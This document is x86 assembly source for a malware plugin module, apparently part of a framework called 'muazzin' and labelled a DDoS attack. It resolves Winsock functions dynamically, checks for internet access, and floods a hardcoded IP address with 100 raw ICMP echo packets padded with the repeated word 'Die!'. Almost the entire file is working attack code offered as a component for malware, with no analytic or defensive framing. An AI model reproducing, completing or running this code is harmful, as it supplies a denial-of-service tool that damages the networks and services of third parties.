;DDoS attack muazzin

BITS 32

%include "\muazzin\muazzin.asi"

TYPE    EQU "DDoS"
VERSION EQU 0001h

PACKETS EQU 100

AF_INET         EQU     2
SOCK_RAW        EQU     3
ICMP_ECHO       EQU     8
IPPROTO_ICMP    EQU     1
SOL_SOCKET      EQU     0FFFFh
SO_RCVTIMEO     EQU     1006h

entry:
       mov esi, [esp+4]
       test dword [esi+m_why], MT_QUERY
       jnz .query
       push esi
       test dword [esi+m_why], MT_APP
       jz .norequest
       call delta
       mov eax, [esi+GPA]
       mov [ebp+getpaddr], eax
       mov eax, [esi+GMH]
       mov [ebp+getmhnd], eax
       call get_apis
       call CheckInet
       jc .no_connect
       sub esp, 200h
       push esp
       push dword 0101h
       call [ebp+WSAStartup]
       add esp, 200h
       push dword PACKETS
       pop ecx
  .again:
       call attack
       loop .again
       call [ebp+WSACleanup]
  .no_connect
       db 068h
  .wsock_handle dd 0
       db 0b8h
  .FreeLibrary dd 0
       call eax
  .norequest:
       pop esi
       mov dword [esi+m_result], MR_DONE
       ret 4

  .query:
       mov esi, MT_QUERY+MT_APP
       mov ebx, TYPE
       mov ecx, VERSION
       mov eax, MR_DONE
       ret 4

delta:
       call .delta
  .delta:
       pop ebp
       sub ebp, .delta
       ret

get_apis:
       call .tmp001
       db "KERNEL32.DLL",0
  .tmp001:
       call [ebp+getmhnd]
       call .tmp002
       db "LoadLibraryA", 0
  .tmp002:
       push eax
       call .tmp003
       db "FreeLibrary", 0
  .tmp003:
       push eax
       call [ebp+getpaddr]
       mov [ebp+entry.FreeLibrary], eax
       call [ebp+getpaddr]
       mov [ebp+load_library], eax
       call .tmp004
       db "WS2_32.DLL", 0
  .tmp004:
       call [ebp+getmhnd]
       mov [ebp+entry.wsock_handle], eax
       mov ebx, eax
       lea esi, [ebp+_apis]
       mov edi, esi
  .loop:
       lodsd
       test eax, eax
       jz .done
       add eax, ebp
       push eax
       push ebx
       call [ebp+getpaddr]
       stosd
       jmp .loop
  .done:
       ret

attack:
       db 0cch
       pushad
       push byte IPPROTO_ICMP
       push byte SOCK_RAW
       push byte AF_INET
       call [ebp+socket]
       mov ebx, eax
       inc eax
       jz .exit
       lea esi, [ebp+ICMP_Packet]
       mov word [esi+2], 0
       push esi
       push dword (ICMP_Packet_End-ICMP_Packet)/2
       pop ecx
       sub edx, edx
  .chksum:
       lodsw
       add dx, ax
       adc dx, 0
       loop .chksum
       not edx
       pop esi
       mov [esi+2], dx
       push byte 16
       lea eax, [ebp+Send_Info]
       push eax
       push byte 0
       push dword (ICMP_Packet_End-ICMP_Packet)
       push esi
       push ebx
       call [ebp+sendto]
       push ebx
       call [ebp+closesocket]
  .exit
       popad
       ret

%include "inet.asi"

getpaddr dd 0
getmhnd  dd 0

load_library dd 0

_apis:
WSAStartup  dd api000
WSACleanup  dd api001
socket      dd api002
closesocket dd api003
sendto      dd api004
            dd 0

api000 db "WSAStartup",0
api001 db "WSACleanup",0
api002 db "socket",0
api003 db "closesocket",0
api004 db "sendto",0

Send_Info:
       dw AF_INET
       dw 0
       db 195, 2, 83, 38
       dd 0, 0

ICMP_Packet:
       db ICMP_ECHO
       db 0
       dw 0                        ;Checksum
       dw 0
       dw 0
times 100 db "Die!"
ICMP_Packet_End:

LOADLIB equ load_library
FREELIB equ entry.FreeLibrary
